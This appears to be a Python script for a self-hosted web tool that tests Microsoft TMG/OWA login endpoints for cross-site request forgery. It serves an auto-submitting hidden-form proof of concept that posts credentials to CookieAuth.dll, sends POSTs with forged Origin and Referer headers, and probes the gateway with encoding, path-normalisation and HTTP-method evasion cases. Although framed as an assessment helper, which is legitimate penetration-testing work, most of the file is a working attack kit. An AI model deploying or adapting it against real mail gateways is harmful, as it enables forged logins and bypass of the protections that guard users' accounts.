#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Simple CSRF assessment helper for TMG/OWA endpoints.
Changes in this version:
- UI text fully in English
- Startup prompts in English
- Added light/dark theme toggle in web UI (persists in localStorage)
"""

import http.server
import socketserver
import ssl
import urllib.parse
import sys
import os
import re
from html import escape
from typing import Dict, List, Tuple, Optional

try:
    import requests
except Exception:
    requests = None

# Default HTTP UA and timeouts used by server-side checks
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
TIMEOUT = 15

# Helpers to read environment variables and interactive prompts

def env(name: str, default: str) -> str:
    return os.environ.get(name, default)


def prompt(prompt_text: str, default: Optional[str] = None) -> str:
    """Console prompt with default value. Used at startup to collect basic config."""
    suffix = f" [{default}]" if default else ""
    val = input(f"{prompt_text}{suffix}: ").strip()
    return val if val else (default or "")

# Base configuration (can be overridden via env or web /config)
TARGET_BASE = env("TARGET_BASE", "https://example.com")
PUBLIC_HOST = env("PUBLIC_HOST", "127.0.0.1")
LISTEN_PORT = int(env("LISTEN_PORT", "4444"))
PUBLIC_PORT = int(env("PUBLIC_PORT", str(LISTEN_PORT)))
LISTEN_HOST = env("LISTEN_HOST", "0.0.0.0")

# Common OWA/FBA endpoints
COOKIEAUTH_PATH = env("COOKIEAUTH_PATH", "/CookieAuth.dll?Logon")
GET_LOGON_PATH = env("GET_LOGON_PATH", "/CookieAuth.dll?GetLogon?curl=Z2FowaZ2F&reason=0&formdir=1")
AUTHOWA_PATH = env("AUTHOWA_PATH", "/owa/auth.owa")
PUBLISHED_SAFE_PATH = env("PUBLISHED_SAFE_PATH", "/owa/")

# CSRF form parameters (for FBA)
CSRF_USERNAME = env("CSRF_USERNAME", "test.user")
CSRF_PASSWORD = env("CSRF_PASSWORD", "NotARealPass123")
CSRF_SUBMIT_NAME = env("CSRF_SUBMIT_NAME", "SubmitCreds")
CSRF_SUBMIT_VALUE = env("CSRF_SUBMIT_VALUE", "Sign in")
CSRF_FLAGS = env("CSRF_FLAGS", "0")
CSRF_FORCEDOWNLEVEL = env("CSRF_FORCEDOWNLEVEL", "0")
CSRF_FORMDIR = env("CSRF_FORMDIR", "1")
CSRF_TRUSTED = env("CSRF_TRUSTED", "0")
CSRF_ISUTF8 = env("CSRF_ISUTF8", "1")
CSRF_CURL = env("CSRF_CURL", "Z2FowaZ2F")
CSRF_DESTINATION = env("CSRF_DESTINATION", "/owa/")

# Optional TLS for this helper server
CERT_FILE = env("CERT_FILE", "")
KEY_FILE = env("KEY_FILE", "")

# Interactive startup prompts (English)
_interactive_target = prompt("Enter target base URL (TARGET_BASE)", TARGET_BASE)
_interactive_public = prompt("Enter your public IP/host for PoC access (PUBLIC_HOST)", PUBLIC_HOST)
_interactive_port = prompt("Enter listen port (LISTEN_PORT/PUBLIC_PORT)", str(LISTEN_PORT))

TARGET_BASE = _interactive_target or TARGET_BASE
PUBLIC_HOST = _interactive_public or PUBLIC_HOST
try:
    LISTEN_PORT = int(_interactive_port)
    # If PUBLIC_PORT not pre-set, keep it aligned with LISTEN_PORT
    PUBLIC_PORT = LISTEN_PORT if not env("PUBLIC_PORT", "") else PUBLIC_PORT
except Exception:
    pass

# Default Origin/Referer used in server-side verification calls
FAKE_ORIGIN_DEFAULT = env("FAKE_ORIGIN", f"http://{PUBLIC_HOST}:{PUBLIC_PORT}")
FAKE_REFERER_DEFAULT = env("FAKE_REFERER", "")

# Utilities

def absolute_url(base: str, path: str) -> str:
    """Join base and path into absolute URL; pass-through if path already absolute."""
    if re.match(r"^https?://", path, re.I):
        return path
    return urllib.parse.urljoin(base if base.endswith('/') else base + '/', path.lstrip('/'))


STATE: Dict[str, object] = {
    "target_base": TARGET_BASE.strip(),
    "cookieauth_url": absolute_url(TARGET_BASE, COOKIEAUTH_PATH),
    "authowa_url": absolute_url(TARGET_BASE, AUTHOWA_PATH),
    "get_logon_url": absolute_url(TARGET_BASE, GET_LOGON_PATH),
    "safe_url": absolute_url(TARGET_BASE, PUBLISHED_SAFE_PATH),
    "cookie_report": "",
    "auto_hidden": {},
    "warnings": [],
}

# Response header parsing helpers

def parse_set_cookie_flags(set_cookie_headers: List[str]) -> List[Dict[str, str]]:
    """Extract basic cookie flags from Set-Cookie headers for reporting."""
    res = []
    for sc in set_cookie_headers:
        parts = [p.strip() for p in sc.split(';')]
        kv = {"raw": sc, "secure": False, "httponly": False, "samesite": None}
        if parts and '=' in parts[0]:
            k, v = parts[0].split('=', 1)
            kv['cookie_name'] = k
            kv['cookie_val_preview'] = (v[:8] + '...') if len(v) > 8 else v
        for p in parts[1:]:
            pl = p.lower()
            if pl == 'secure':
                kv['secure'] = True
            if pl == 'httponly':
                kv['httponly'] = True
            if pl.startswith('samesite='):
                kv['samesite'] = pl.split('=', 1)[1]
        res.append(kv)
    return res


def pretty_cookie_report(items: List[Dict[str, str]]) -> str:
    if not items:
        return "(no Set-Cookie observed)"
    return "\n".join([
        f"- {i.get('cookie_name','(unknown)')}: Secure={i.get('secure')} HttpOnly={i.get('httponly')} SameSite={i.get('samesite')} | {i.get('raw')}"
        for i in items
    ])


def extract_hidden_inputs(html: str) -> Dict[str, str]:
    """Naive extraction of hidden <input> fields to carry them in PoC form."""
    found: Dict[str, str] = {}
    for m in re.finditer(r"<input\\b[^>]*>", html, re.I | re.S):
        tag = m.group(0)
        ty = re.search(r"type=\"([^\"]+)\"|type='([^']+)'", tag, re.I)
        nm = re.search(r"name=\"([^\"]+)\"|name='([^']+)'", tag, re.I)
        vl = re.search(r"value=\"([^\"]*)\"|value='([^']*)'", tag, re.I)
        typ = (ty.group(1) if ty and ty.group(1) else (ty.group(2) if ty else '')).lower()
        if typ != 'hidden':
            continue
        name = nm.group(1) if nm and nm.group(1) else (nm.group(2) if nm else '')
        val = vl.group(1) if vl and vl.group(1) is not None else (vl.group(2) if vl else '')
        if name:
            found[name] = val
    return found


def warm_up() -> None:
    """Warm-up the target to collect initial cookies and hidden fields."""
    if requests is None:
        STATE["warnings"].append("requests not installed — warm-up skipped")
        return
    try:
        s = requests.Session()
        s.headers.update({"User-Agent": UA})
        r = s.get(STATE["get_logon_url"], timeout=TIMEOUT, allow_redirects=True)
        set_cookie = r.headers.get('Set-Cookie')
        all_sc = []
        if set_cookie:
            raw = getattr(getattr(r, 'raw', None), 'headers', None)
            all_sc = raw.get_all('Set-Cookie') if raw and hasattr(raw, 'get_all') else [set_cookie]
        STATE["cookie_report"] = pretty_cookie_report(parse_set_cookie_flags(all_sc))
        STATE["auto_hidden"] = extract_hidden_inputs(r.text)
    except Exception as e:
        STATE["warnings"].append(f"Warm-up failed: {e}")


warm_up()

# Build CSRF payload for FBA form submit

def build_payload() -> Dict[str, str]:
    p: Dict[str, str] = {}

    def put(k, v):
        if v is not None and str(v) != "":
            p[k] = str(v)

    put("username", CSRF_USERNAME)
    put("password", CSRF_PASSWORD)
    put(CSRF_SUBMIT_NAME, CSRF_SUBMIT_VALUE)
    put("flags", CSRF_FLAGS)
    put("forcedownlevel", CSRF_FORCEDOWNLEVEL)
    put("formdir", CSRF_FORMDIR)
    put("trusted", CSRF_TRUSTED)
    put("isUtf8", CSRF_ISUTF8)
    put("curl", CSRF_CURL)
    put("destination", CSRF_DESTINATION)
    for k, v in STATE["auto_hidden"].items():
        if k not in p:
            p[k] = v
    return p


def resolve_origin_and_referer(origin: Optional[str], referer: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
    """Determine effective Origin/Referer for verification calls."""
    fo = (origin or FAKE_ORIGIN_DEFAULT)
    fr = (referer or FAKE_REFERER_DEFAULT)
    if not fr and fo:
        fr = fo.rstrip('/') + '/poc'
    if fo == "__NONE__":
        fo = None
    if fr == "__NONE__":
        fr = None
    return fo, fr


# Test cases for normalization/resilience checks
ENCODING_TESTS = [
    ("double_percent", lambda base: base.rstrip('/') + "/%256f%2577%2561/"),
    ("encoded_slash", lambda base: base.rstrip('/') + "/%2fowa%2f"),
    ("mixed_case_hex", lambda base: base.rstrip('/') + "/%2FOWA%2f"),
    ("utf8_overlong_like", lambda base: base.rstrip('/') + "/%c0%afowa%2f"),
]

PATH_TESTS = [
    ("dot_segments", lambda base: base.rstrip('/') + "/owa/../owa/"),
    ("double_slash", lambda base: base.rstrip('/') + "//owa//"),
    ("backslash_encoded", lambda base: base.rstrip('/') + "/%5cowa%5c"),
    ("semicolon_path", lambda base: base.rstrip('/') + "/owa/;param"),
]

HEADER_TESTS = [
    ("content_type_unusual", {"Content-Type": "text/plain"}),
    ("duplicate_like_case", {"X-Dummy": "a", "x-dummy": "b"}),
]

METHOD_TESTS = [
    ("OPTIONS", "OPTIONS"),
    ("PUT", "PUT"),
    ("TRACE", "TRACE"),
]


def http_try(method: str, url: str, headers: Optional[Dict[str, str]] = None,
             data: Optional[Dict[str, str]] = None, allow_redirects: bool = True) -> Tuple[int, str, str]:
    """Perform a single HTTP call for test case, returning (status, location, set-cookie)."""
    if requests is None:
        return (0, "", "")
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})
    try:
        r = sess.request(method=method, url=url, headers=headers or {}, data=data, timeout=TIMEOUT,
                         allow_redirects=allow_redirects)
        loc = r.url if allow_redirects else r.headers.get("Location", "")
        sc = r.headers.get("Set-Cookie", "")
        return (r.status_code, loc, sc)
    except Exception as e:
        return (-1, str(e), "")


def run_suite(origin: Optional[str], referer: Optional[str]) -> Dict:
    """Run encoding/path/header/method probes against published endpoints."""
    fo, fr = resolve_origin_and_referer(origin, referer)
    results = {"origin": fo or "(none)", "referer": fr or "(none)", "encoding": [], "path": [], "headers": [], "methods": []}
    common_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    if fo is not None:
        common_headers["Origin"] = fo
    if fr is not None:
        common_headers["Referer"] = fr
    for name, builder in ENCODING_TESTS:
        url = builder(STATE["safe_url"]) if name != "encoded_slash" else builder(STATE["target_base"])  
        st, loc, sc = http_try("GET", url, headers=common_headers, allow_redirects=False)
        results["encoding"].append({"case": name, "url": url, "status": st, "location": loc, "cookie": sc})
    for name, builder in PATH_TESTS:
        url = builder(STATE["safe_url"])
        st, loc, sc = http_try("GET", url, headers=common_headers, allow_redirects=False)
        results["path"].append({"case": name, "url": url, "status": st, "location": loc, "cookie": sc})
    for name, hdrs in HEADER_TESTS:
        h = dict(common_headers)
        h.update(hdrs)
        st, loc, sc = http_try("POST", STATE["authowa_url"], headers=h, data={"probe": "1"}, allow_redirects=False)
        results["headers"].append({"case": name, "status": st, "location": loc, "cookie": sc})
    for name, method in METHOD_TESTS:
        st, loc, sc = http_try(method, STATE["safe_url"], headers=common_headers, allow_redirects=False)
        results["methods"].append({"case": name, "status": st, "location": loc, "cookie": sc})
    return results


def build_payload_kv(payload: Dict[str, str]) -> str:
    return "\n".join([f"{k}={v}" for k, v in payload.items()])


# ---------- HTML layout helpers with theme toggle ----------

def html_layout(title: str, body_html: str) -> str:
    """Wrap content with a shared HTML layout and theme toggle (light/dark)."""
    return f"""<!doctype html>
<html>
<head>
  <meta charset='utf-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <title>{escape(title)}</title>
  <style>
    :root {{
      --bg: #ffffff; --fg: #111827; --card: #f6f8fa; --btn-bg: #111827; --btn-fg: #ffffff; --border: #e5e7eb;
      --link: #2563eb;
    }}
    :root[data-theme="dark"] {{
      --bg: #0b0f14; --fg: #e5e7eb; --card: #0f1620; --btn-bg: #2563eb; --btn-fg: #ffffff; --border: #1f2937; --link:#60a5fa;
    }}
    html, body {{ height: 100%; }}
    body {{
      margin: 2rem; max-width: 1100px; font-family: system-ui, Segoe UI, Roboto, Arial, sans-serif;
      background: var(--bg); color: var(--fg);
    }}
    a {{ color: var(--link); text-decoration: none; }}
    a.btn {{ display:inline-block; background: var(--btn-bg); color: var(--btn-fg); padding:.5rem 1rem; border-radius:6px; margin-right:8px; }}
    code, pre {{ background: var(--card); padding:.25rem .5rem; border-radius:4px; }}
    .card {{ border:1px solid var(--border); border-radius:8px; padding:12px; margin-bottom:12px; }}
    table {{ border-collapse: collapse; width:100%; }}
    th, td {{ border:1px solid var(--border); padding:6px 8px; text-align:left; }}
    nav {{ display:flex; justify-content:space-between; align-items:center; margin-bottom: 12px; }}
    #themeToggle {{ background: var(--btn-bg); color: var(--btn-fg); border:none; padding:.4rem .8rem; border-radius:6px; cursor:pointer; }}
  </style>
  <script>
    // Theme initialization: read from localStorage or default to light
    (function() {{
      try {{
        var t = localStorage.getItem('theme') || 'light';
        document.documentElement.setAttribute('data-theme', t);
        window.__theme = t;
      }} catch(e) {{}}
    }})();
    function toggleTheme() {{
      var cur = document.documentElement.getAttribute('data-theme') || 'light';
      var next = (cur === 'dark') ? 'light' : 'dark';
      document.documentElement.setAttribute('data-theme', next);
      try {{ localStorage.setItem('theme', next); }} catch(e) {{ }}
      var btn = document.getElementById('themeToggle');
      if (btn) btn.textContent = 'Theme: ' + (next === 'dark' ? 'Dark' : 'Light');
    }}
    window.addEventListener('DOMContentLoaded', function() {{
      var cur = document.documentElement.getAttribute('data-theme') || 'light';
      var btn = document.getElementById('themeToggle');
      if (btn) btn.textContent = 'Theme: ' + (cur === 'dark' ? 'Dark' : 'Light');
    }});
  </script>
</head>
<body>
  <nav>
    <div><strong>TMG CSRF Assessment Tool</strong></div>
    <div><button id='themeToggle' onclick='toggleTheme()' title='Toggle light/dark theme'>Theme</button></div>
  </nav>
  {body_html}
</body>
</html>"""


# ---------- Pages ----------

def page_index() -> str:
    body = f"""
<h1>Overview</h1>
<p><strong>Target:</strong> <code>{escape(TARGET_BASE)}</code></p>
<p><strong>Warm-up URL:</strong> <code>{escape(STATE['get_logon_url'])}</code></p>
<div class='card'>
  <h3>Actions</h3>
  <p>
    <a class='btn' href='/config'>Config</a>
    <a class='btn' href='/poc'>Browser CSRF PoC</a>
    <a class='btn' href='/verify-deep?origin={escape(FAKE_ORIGIN_DEFAULT)}'>Deep Verify</a>
    <a class='btn' href='/suite?origin={escape(FAKE_ORIGIN_DEFAULT)}'>Run Suite</a>
  </p>
</div>
<div class='card'>
  <h3>Cookie report (warm-up)</h3>
  <pre>{escape(STATE['cookie_report'] or '(no Set-Cookie observed)')}</pre>
</div>
"""
    return html_layout("TMG CSRF Assessment Tool", body)


def page_config(query: Dict[str, str]) -> str:
    """Config form: edit target/public host/port and fake origin/referer; edit CSRF creds."""
    global CSRF_USERNAME, CSRF_PASSWORD
    if query.get("save") == "1":
        global TARGET_BASE, PUBLIC_HOST, PUBLIC_PORT, FAKE_ORIGIN_DEFAULT, FAKE_REFERER_DEFAULT
        TARGET_BASE = query.get("target_base", TARGET_BASE).strip()
        PUBLIC_HOST = query.get("public_host", PUBLIC_HOST).strip()
        try:
            p = int(query.get("public_port", str(PUBLIC_PORT)))
            globals()["PUBLIC_PORT"] = p
        except Exception:
            pass
        FAKE_ORIGIN_DEFAULT = query.get("fake_origin", FAKE_ORIGIN_DEFAULT).strip() or FAKE_ORIGIN_DEFAULT
        FAKE_REFERER_DEFAULT = query.get("fake_referer", FAKE_REFERER_DEFAULT).strip()
        new_user = query.get("csrf_username", "").strip()
        new_pass = query.get("csrf_password", "")
        if new_user:
            CSRF_USERNAME = new_user
        if new_pass:
            CSRF_PASSWORD = new_pass
        STATE["target_base"] = TARGET_BASE
        STATE["cookieauth_url"] = absolute_url(TARGET_BASE, COOKIEAUTH_PATH)
        STATE["authowa_url"] = absolute_url(TARGET_BASE, AUTHOWA_PATH)
        STATE["get_logon_url"] = absolute_url(TARGET_BASE, GET_LOGON_PATH)
        STATE["safe_url"] = absolute_url(TARGET_BASE, PUBLISHED_SAFE_PATH)
    masked_user = CSRF_USERNAME
    body = f"""
<h1>Configuration</h1>
<form method='get' action='/config'>
  <input type='hidden' name='save' value='1'>
  <label>Target Base</label>
  <input name='target_base' value='{escape(TARGET_BASE)}' style='width:100%'>
  <label>Public Host (external IP/host)</label>
  <input name='public_host' value='{escape(PUBLIC_HOST)}' style='width:100%'>
  <label>Public Port</label>
  <input name='public_port' value='{escape(str(PUBLIC_PORT))}' style='width:100%'>
  <label>Fake Origin (server verify)</label>
  <input name='fake_origin' value='{escape(FAKE_ORIGIN_DEFAULT)}' style='width:100%'>
  <label>Fake Referer (server verify)</label>
  <input name='fake_referer' value='{escape(FAKE_REFERER_DEFAULT)}' style='width:100%'>
  <hr>
  <label>CSRF Username</label>
  <input name='csrf_username' value='{escape(masked_user)}' style='width:100%'>
  <label>CSRF Password (leave blank to keep unchanged)</label>
  <input name='csrf_password' type='password' value='' style='width:100%'>
  <div style='margin-top:1rem'><button type='submit' class='btn'>Save</button> <a class='btn' href='/'>Back</a></div>
</form>
"""
    return html_layout("Config", body)


def page_poc() -> str:
    """Browser-based CSRF PoC form auto-submitting to CookieAuth.dll."""
    action = STATE["cookieauth_url"]
    payload = build_payload()
    inputs = "\n".join([f"    <input type='hidden' name='{escape(k)}' value='{escape(v)}'>" for k, v in payload.items()])
    pretty = build_payload_kv(payload)
    body = f"""
<h1>CSRF Browser PoC → <code>{escape(action)}</code></h1>
<form id='csrf' method='POST' action='{escape(action)}' enctype='application/x-www-form-urlencoded'>
{inputs}
  <noscript><button type='submit' class='btn'>Submit</button></noscript>
</form>
<script>setTimeout(function(){{document.getElementById('csrf').submit();}},800);</script>
<h3>Payload</h3>
<pre>{escape(pretty)}</pre>
<p><a class='btn' href='/'>Back</a></p>
"""
    return html_layout("CSRF Browser PoC", body)


def verify_common(deep: bool, origin: Optional[str], referer: Optional[str]) -> Tuple[str, str, str, str]:
    """Perform server-side POST to CookieAuth.dll and evaluate protection markers."""
    if requests is None:
        return ("requests not installed", "", "", "UNSURE")
    fo, fr = resolve_origin_and_referer(origin, referer)
    url = STATE["cookieauth_url"]
    data = build_payload()
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    if fo is not None:
        headers["Origin"] = fo
    if fr is not None:
        headers["Referer"] = fr
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})
    try:
        sess.get(STATE["get_logon_url"], timeout=TIMEOUT, allow_redirects=True)
    except Exception:
        pass
    r = sess.post(url, data=data, headers=headers, timeout=TIMEOUT, allow_redirects=deep)
    chain = [*getattr(r, "history", []), r] if deep else [r]
    status = str(r.status_code)
    location = r.url if deep else r.headers.get("Location", "")
    set_cookie = r.headers.get("Set-Cookie", "")
    blocked = False
    for rr in chain:
        if rr.status_code in (400, 403):
            blocked = True
        loc = rr.headers.get("Location", "") or rr.url
        sc = rr.headers.get("Set-Cookie", "") or ""
        if re.search(r"CookieAuth\\.dll\?GetLogon", loc or "", re.I):
            blocked = True
        if re.search(r"expires=Thu, 01-Jan-1970", sc or "", re.I):
            blocked = True
    verdict = "CSRF protection likely ENABLED" if blocked else "CSRF protection possibly NOT enforced"
    return (status, location, set_cookie, verdict)


def page_verify(query: Dict[str, str], deep: bool = False) -> str:
    status, location, set_cookie, verdict = verify_common(deep, query.get("origin"), query.get("referer"))
    body = f"""
<h1>{'Deep ' if deep else ''}Verify Result</h1>
<ul>
  <li>Status: <code>{escape(status)}</code></li>
  <li>Location: <code>{escape(location or '(none)')}</code></li>
  <li>Set-Cookie: <code>{escape(set_cookie or '(none)')}</code></li>
</ul>
<p><strong>Verdict:</strong> {escape(verdict)}</p>
<p><a class='btn' href='/'>Back</a></p>
"""
    return html_layout("Verify Result", body)


def page_suite(query: Dict[str, str]) -> str:
    origin = query.get("origin")
    referer = query.get("referer")
    res = run_suite(origin, referer)

    def rows(items):
        return "".join([
            f"<tr><td>{escape(i['case'])}</td><td><code>{escape(str(i.get('url','')))}</code></td>"
            f"<td>{escape(str(i['status']))}</td><td><code>{escape(i['location'] or '')}</code></td>"
            f"<td><code>{escape((i['cookie'] or '')[:120])}</code></td></tr>" for i in items
        ])

    body = f"""
<h1>Defense Assessment Suite</h1>
<p>Origin={escape(res['origin'])}; Referer={escape(res['referer'])}</p>
<h3>Encoding</h3>
<table><thead><tr><th>case</th><th>url</th><th>status</th><th>location</th><th>set-cookie</th></tr></thead><tbody>{rows(res['encoding'])}</tbody></table>
<h3>Path</h3>
<table><thead><tr><th>case</th><th>url</th><th>status</th><th>location</th><th>set-cookie</th></tr></thead><tbody>{rows(res['path'])}</tbody></table>
<h3>Headers</h3>
<table><thead><tr><th>case</th><th>url</th><th>status</th><th>location</th><th>set-cookie</th></tr></thead><tbody>{rows(res['headers'])}</tbody></table>
<h3>Methods</h3>
<table><thead><tr><th>case</th><th>url</th><th>status</th><th>location</th><th>set-cookie</th></tr></thead><tbody>{rows(res['methods'])}</tbody></table>
<p><a class='btn' href='/'>Back</a></p>
"""
    return html_layout("Defense Suite", body)


# ---------- HTTP Handler ----------

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            return self._send_html(200, page_index())
        if self.path.startswith('/config'):
            q = urllib.parse.urlsplit(self.path).query
            return self._send_html(
                200,
                page_config({k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}),
            )
        if self.path.startswith('/poc'):
            return self._send_html(200, page_poc())
        if self.path.startswith('/verify-deep'):
            q = urllib.parse.urlsplit(self.path).query
            return self._send_html(
                200,
                page_verify({k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}, deep=True),
            )
        if self.path.startswith('/verify'):
            q = urllib.parse.urlsplit(self.path).query
            return self._send_html(
                200,
                page_verify({k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}, deep=False),
            )
        if self.path.startswith('/suite'):
            q = urllib.parse.urlsplit(self.path).query
            return self._send_html(
                200,
                page_suite({k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}),
            )
        return self.send_error(404, 'Not Found')

    def do_POST(self):
        return self.send_error(405, 'Method Not Allowed')

    def log_message(self, fmt, *items):
        """Override default logging format; *items holds positional arguments for fmt."""
        sys.stdout.write("[HTTP] " + (fmt % items) + "\n")

    def _send_html(self, code: int, html: str):
        data = html.encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)


# ---------- Main entry ----------

def main():
    httpd = socketserver.TCPServer((LISTEN_HOST, LISTEN_PORT), Handler)
    scheme = 'http'
    if CERT_FILE and KEY_FILE:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        scheme = 'https'
    port_part = '' if (scheme == 'https' and PUBLIC_PORT == 443) or (scheme == 'http' and PUBLIC_PORT == 80) else f':{PUBLIC_PORT}'
    public_url = f"{scheme}://{PUBLIC_HOST}{port_part}"
    print(f"[+] Listening on {scheme}://{LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[i] Public URL: {public_url}")
    print(f"[i] Open {public_url}/ → /poc, /verify-deep?origin=..., /suite?origin=... | /config to edit")
    try:
        httpd.serve_forever()
    finally:
        httpd.server_close()


if __name__ == '__main__':
    main()
